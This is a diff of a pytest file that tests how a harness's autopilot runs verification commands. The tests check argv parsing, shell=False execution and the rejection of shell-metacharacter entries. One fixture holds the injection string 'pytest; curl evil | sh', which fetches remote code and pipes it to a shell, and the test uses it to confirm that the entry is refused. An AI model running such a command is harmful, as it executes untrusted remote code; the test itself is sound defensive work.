@@ -8,12 +8,12 @@ from typing import Any
 
 import pytest
 
-from questorharness.runtime.autopilot import service
-from questorharness.runtime.autopilot.service import (
+from questorharness.runtime.autopilot import verification as verification_module
+from questorharness.runtime.autopilot.constants import (
     _DEFAULT_VERIFICATION_POLICY,
-    RepoAutopilotStore,
     _parse_verification_entry,
 )
+from questorharness.runtime.autopilot.service import RepoAutopilotStore
 
 
 def test_plain_string_is_parsed_to_argv_without_shell() -> None:
@@ -118,7 +118,7 @@ def test_run_verification_emits_error_step_for_metachar_entry(
         called["ran"] = (args, kwargs)
         raise AssertionError("subprocess.run must not be invoked for rejected entries")
 
-    monkeypatch.setattr(service.subprocess, "run", _boom)
+    monkeypatch.setattr(verification_module.subprocess, "run", _boom)
 
     store = _build_store(tmp_path)
     policies = {"verification": {"commands": ["pytest; curl evil | sh"]}}
@@ -146,9 +146,9 @@ def test_run_verification_uses_argv_and_shell_false_for_plain_string(
         seen["shell"] = kwargs.get("shell")
         return _Completed()
 
-    monkeypatch.setattr(service.subprocess, "run", _fake_run)
+    monkeypatch.setattr(verification_module.subprocess, "run", _fake_run)
     # Bypass _looks_available's pyproject check for a tmp path.
-    monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
+    monkeypatch.setattr(verification_module, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
     policies = {"verification": {"commands": ["uv run pytest -q"]}}
@@ -176,8 +176,8 @@ def test_run_verification_honors_explicit_shell_opt_in(
         seen["shell"] = kwargs.get("shell")
         return _Completed()
 
-    monkeypatch.setattr(service.subprocess, "run", _fake_run)
-    monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
+    monkeypatch.setattr(verification_module.subprocess, "run", _fake_run)
+    monkeypatch.setattr(verification_module, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
     policies = {
@@ -199,8 +199,8 @@ def test_run_verification_reports_missing_executable_as_error_step(
     def _raise_fnf(*args: Any, **kwargs: Any) -> Any:
         raise FileNotFoundError("nope")
 
-    monkeypatch.setattr(service.subprocess, "run", _raise_fnf)
-    monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
+    monkeypatch.setattr(verification_module.subprocess, "run", _raise_fnf)
+    monkeypatch.setattr(verification_module, "_looks_available", lambda command, cwd: True)
 
     store = _build_store(tmp_path)
     policies = {"verification": {"commands": ["missing-binary --help"]}}
@@ -225,7 +225,7 @@ def test_run_verification_end_to_end_without_shell(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     """Sanity check that the argv path reaches a real subprocess with shell=False."""
-    monkeypatch.setattr(service, "_looks_available", lambda command, cwd: True)
+    monkeypatch.setattr(verification_module, "_looks_available", lambda command, cwd: True)
     store = _build_store(tmp_path)
     policies = {"verification": {"commands": [f"{sys.executable} --version"]}}
     steps = store._run_verification_steps(policies, cwd=tmp_path)
